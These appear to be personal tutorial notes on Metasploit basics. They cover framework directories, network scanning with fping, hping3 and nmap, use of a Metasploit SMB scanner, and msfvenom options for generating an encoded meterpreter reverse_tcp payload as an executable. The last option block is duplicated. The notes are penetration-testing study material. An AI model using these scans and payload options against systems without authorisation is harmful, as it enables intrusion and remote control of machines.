


* Tutorial
** Metasploit Basics - 

*** Metasploit Directories
  - .msf
    - history
    - logs
    - loot
    - modules (custom)
    - plugins (custom)
    - connection to db
  - metasploit directory
    - data
    - docs (if created)
    - external
    - lib
    - modules
    - plugins
    - scripts
*** Finding Targets through Scanning
+ layer 2
  - arping & fping
+ layer 3
  - hping3
+ Port/Service
  - nmap
  - metasploit
+ Vulnerability
  - metasploit

+ arping
  - simple layer to ping tool
+ fping
  - allows for blanket scans
  - no continous output, just end result
  - > fping -c 1 -g x.x.x.y1 x.x.x.y2
  
+ hping3
  - is able to perform traceroute with --traceroute
  - port checking - > hping3 -v -s -p 80 -s 4444 x.x.x.x
  - -S - syn packet -p - port -s - source port
  
+ nmap
  > nmap -PR -sn x.x.x.y-y - arp scan
  > nmap -sn -PE x.x.x.y-y - ping response
  > nmap -sn -PU53 x.x.x.y-y - search machine with specific port
  
+ Metasploit - Scanners
  msf> search scanner - this will produce a list of scanners
  msf> use auxiliary/scanner/smb/smb_enumshares
  msf> show options
  msf> set RHOST x.x.x.x
  - makesure that all options required are set
  
*** Exploitation Steps
  - Identify target
  - Seclect Exploit
  - Create Listener
  - Exploit
  
+ msfvenom
  - msfpayload + msfencode = msfvenom
  - options
    -p payload e.g windows/meterpreter/reverse_tcp
    -e encode e.g x86/shikata_ga_nai
    -i iterations e.g how many times to encode
    -b bad chars e.g '\x00'
    -LHOST=x.x.x.x - ip on host machine that payload will be on
    -LPORT=xx - port on host machine that payload will run on
    -f file type e.g -f exe > Payload.exe
    
    -b bad chars e.g '\x00'
    -LHOST=x.x.x.x - ip on host machine that payload will be on
    -LPORT=xx - port on host machine that payload will run on
    -f file type e.g -f exe > Payload.exe
